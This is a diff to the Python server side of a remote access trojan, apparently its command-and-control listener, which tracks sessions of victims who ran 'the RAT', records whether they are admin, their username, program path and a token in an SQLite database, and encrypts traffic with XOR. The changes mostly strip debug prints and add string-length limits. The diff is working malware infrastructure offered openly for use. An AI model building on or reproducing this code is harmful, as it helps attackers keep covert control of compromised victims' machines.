@@ -11,7 +11,6 @@ from .sql import Sql
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT, SPLIT 
 
 
-
 class Handler(threading.Thread):
     '''
     This class allows to manage the incoming connection, 
@@ -24,6 +23,7 @@ class Handler(threading.Thread):
     PBKDF2_Key = None #Generates the key to encrypt and decrypt data using the XOR algorithm.
     start_handler = False
 
+
     def __init__(self,host,port,display, ObjSql,password):
 
         threading.Thread.__init__(self)
@@ -35,13 +35,13 @@ class Handler(threading.Thread):
         
         Handler.PBKDF2_Key = generate_PBKDF2_key(password)
 
+
     def initialization(self):
         """
         filled in the dictionary dict_conn via the database.
         (The socket is not saved by default in the database).
         """
         #self.ObjSql.setDB()
-        print("In initialization:")
         list_of_rows = self.ObjSql.selectAll()
 
         if(bool(list_of_rows)): #verify if the list is empty
@@ -66,7 +66,8 @@ class Handler(threading.Thread):
         else:
             #print("[?] NOT Value in database.")
             pass
-            
+
+
     def SuccessfullyQuit(self):
         try:
             print("\n")
@@ -82,6 +83,7 @@ class Handler(threading.Thread):
         self.sock_server.close()
         printColor("error","\r[-] Connexion server closed.")
     
+
     def run(self):
         Handler.status_connection_display = self.display
 
@@ -116,8 +118,6 @@ class Handler(threading.Thread):
             #handshake.daemon = True
             handshake.start()
             handshake.join()
-            printColor("error","finish")
-
 
 
 class HandShake(threading.Thread):
@@ -135,31 +135,35 @@ The client first sends this information, then the server sends the parameters as
         self.address = address
         self.ObjSql = ObjSql
 
-    '''
-    def sendUltraSafe(self, data):
-        
-        try:
-            self.conn.send(data.encode())
-            #print("[+] send: ",data)
-        except Exception as e:
-            print(e)
-        else:
-            try:
-               # print("EN ATTENTE dans la reponse de ultrasafe")
-                self.conn.settimeout(SOCK_TIMEOUT)
-                confirmation = self.conn.recv(4096).decode("utf8")
-            except Exception as e:
-                printColor("error","Error in sendUltraSafe: {}\n".format(e))
+
+    def checkString(self, string_to_test, string_len_max):
+        '''
+        test if the string is too big.
+        If the string is too big it can cause display bugs.
+        '''
+        result = ""
+        i = 0
+        string_to_test = str(string_to_test)
+
+        while(True):
+            
+            if(i >= len(string_to_test)): 
+                break
+            
+            elif(i >= string_len_max):
+                break
+            
             else:
-                if(confirmation == "\r\n"):
-                    print("IN SENDULTRASAFE CONFIRMATION OK")
-                    pass
+                try:
+                    
+                    result += string_to_test[i]
+                except IndexError as e:
+                    #print("-->",e)
+                    break
                 else:
-                   # print("IN SENDULTRASAFE CONFIRMATION NOT OK")
-                    pass
-        
-        self.conn.settimeout(None)
-    '''
+                    i+= 1
+
+        return result
 
 
     def recvUltraSafe(self):
@@ -167,7 +171,6 @@ The client first sends this information, then the server sends the parameters as
         self.conn.settimeout(SOCK_TIMEOUT)
         try:
             data = self.conn.recv(4096).decode("utf8","replace")
-            print("\n\nDATA:",data)
         except socket.timeout:
             #print("timeout in recvultrasafe")
             pass
@@ -175,7 +178,6 @@ The client first sends this information, then the server sends the parameters as
             printColor("error", "[-] Error in recvUltraSafe: {} .\n".format(e))
         else:   
             try:
-                print("SEND confirmation in recvultrasafe.")
                 self.conn.send(XOREncryption("\r\n",Handler.PBKDF2_Key).encode())
             except Exception:
                 printColor("error", "[-] Error in recvUltraSafe when confirming.")
@@ -203,27 +205,25 @@ The client first sends this information, then the server sends the parameters as
         while True:
             data = self.recvUltraSafe()
             
-            print("DATA IN LOOP____>",data, "<------")
-            print("len: ", len(data))
-            
             #print(data)
             if(data == "\r\n"):
-                print("Stop recvFirstInfo")
                 break
            
             tmp = data.split(SPLIT)
-            print("\nSPLIT: ",tmp,"\n")
             if(tmp[0]=="MOD_RECONNECT"): #MOD_RECONNECT  | TOKEN fdsafafsdfsadf3454sdfasdf5
-                print("MOD RECONNECT DETECT")
+                #print("MOD RECONNECT DETECT")
                 token = tmp[1]
-                print("TOKKEN: ", token)
-                print(self.address)
+                #print("TOKKEN: ", token)
+                #print(self.address)
+                
                 if bool(Handler.dict_conn): 
                     for target in Handler.dict_conn.values():
                         if(target[NB_TOKEN] == token and target[NB_IP] == self.address[0]): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
-                            print("!!!!Token doublon!!!!")
-                            print(self.address)
-
+                            #print("!!!!Token doublon!!!!")
+                            
+                            if(Handler.status_connection_display):
+                                printColor("information","[+] a client is trying to reconnect to the server: session: {} {}:{}\n".format(target[0],self.address[0],self.address[1]) )
+                            
                             if not (target[NB_ALIVE]): #if target is not already alive:
                                 '''
                                 If several customers have the same token it means that a machine has executed the RAT several times.
@@ -237,27 +237,27 @@ The client first sends this information, then the server sends the parameters as
                                 pass
 
                 else:
-                    print("dict empty")
+                    #print("dict empty")
                     pass
             
             elif(tmp[0] == "MOD_HANDSHAKE_IS_ADMIN"):
-                is_admin = tmp[1]
+                is_admin = self.checkString(tmp[1], 10)
 
             elif(tmp[0] == "MOD_HANDSHAKE_PATH_PROG"):
-                path_prog = tmp[1]
+                path_prog = self.checkString(tmp[1], 256) 
             
             elif(tmp[0] == "MOD_HANDSHAKE_NAME_USER"):
-                name_user = tmp[1]
+                name_user = is_admin = self.checkString(tmp[1], 80)
 
             elif(tmp[0]=="MOD_HANDSHAKE_TOKEN"):
-                token = tmp[1]
+                token = self.checkString(tmp[1], 40)
 
             else:
                 printColor("error","[-] An error occurred during handshake mode.")
                 printColor("error","[-] Information may be recorded as UNKNOWN.\n")
                 
                 if(max_error > 4): #4 error max
-                    printColor("error","TROP DERREUR TA MERE")
+                    printColor("error","[-] too many errors occurred when receiving information from the client.\n")
                     break
                 else:
                     max_error +=1 
@@ -266,7 +266,6 @@ The client first sends this information, then the server sends the parameters as
         #append data in dict
         if(already_in_the_dictionary):
             tpl = already_in_the_dictionary, nb_session_of_conn 
-            #print("_______",type(tpl))
             return tuple(tpl)
         
         else:
@@ -279,7 +278,6 @@ The client first sends this information, then the server sends the parameters as
 
     def run(self):
 
-       # self.ObjSql.setDB()
         info = self.recvFirstInfo() #Collect informations with Handshake client. #1
           
         #print("test in info ->",len(info))
@@ -288,7 +286,6 @@ The client first sends this information, then the server sends the parameters as
             #print("sencode part persi go !!!! ")
             if type(info) == list:
                 if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
-                    printColor("error","NEWS CLIENT !!!")
                     self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3])
                     #print("IP IN DATABASE IS: ", self.ObjSql.returnValue(Handler.number_conn, "socket"))
                                                                                                                                                                         #select       
@@ -297,9 +294,8 @@ The client first sends this information, then the server sends the parameters as
                 #print("type of dict_conn ----->",type(Handler.dict_conn))
         
             if type(info) == tuple:#If the client tries to reconnect: | return Bool
-                print("Reconnect change dict.")
+                #print("Reconnect change dict.")
                 nb_session = info[1]
-                print("number session: ", nb_session)
                 #Session number does not change value
                 Handler.dict_conn[nb_session][NB_SOCKET] = self.conn
                 Handler.dict_conn[nb_session][NB_IP] = self.address[0]
@@ -308,16 +304,16 @@ The client first sends this information, then the server sends the parameters as
                 
                 #other information does not change:
                 #The information is retrieved from the database to the dictionary:
-                print("ADMIN: ")
+                #print("ADMIN: ")
                 Handler.dict_conn[nb_session][NB_ADMIN] = self.ObjSql.returnValue(nb_session,"is_he_admin")
-                print("PATH")
+                #print("PATH")
                 Handler.dict_conn[nb_session][NB_PATH] = self.ObjSql.returnValue(nb_session,"path_RAT")
-                print("USRNAME: ")
+                #print("USRNAME: ")
                 Handler.dict_conn[nb_session][NB_USERNAME] = self.ObjSql.returnValue(nb_session,"username")
-                print("TOKEN: ")
+                #print("TOKEN: ")
                 Handler.dict_conn[nb_session][NB_TOKEN] = self.ObjSql.returnValue(nb_session,"token")
-                print("TOKEN:", Handler.dict_conn[nb_session][NB_TOKEN])
-                print("SELECT")
+                #print("TOKEN:", Handler.dict_conn[nb_session][NB_TOKEN])
+                #print("SELECT")
                 Handler.dict_conn[nb_session][NB_SELECT] = False 
                 
         else:
@@ -325,14 +321,3 @@ The client first sends this information, then the server sends the parameters as
             pass 
 
         #self.conn.send(b"dir")  
-        printColor("information","\n\n[FINISH]")
-
-        
-
-
-#firsr error: 0
-#seconde error: 10053
-
-#Le logiciel a provoqué la déconnexion.
-#Une connexion établie a été interrompue par le logiciel de votre ordinateur hôte, 
-#probablement en raison d'un délai de transmission de données ou d'une erreur de protocole.
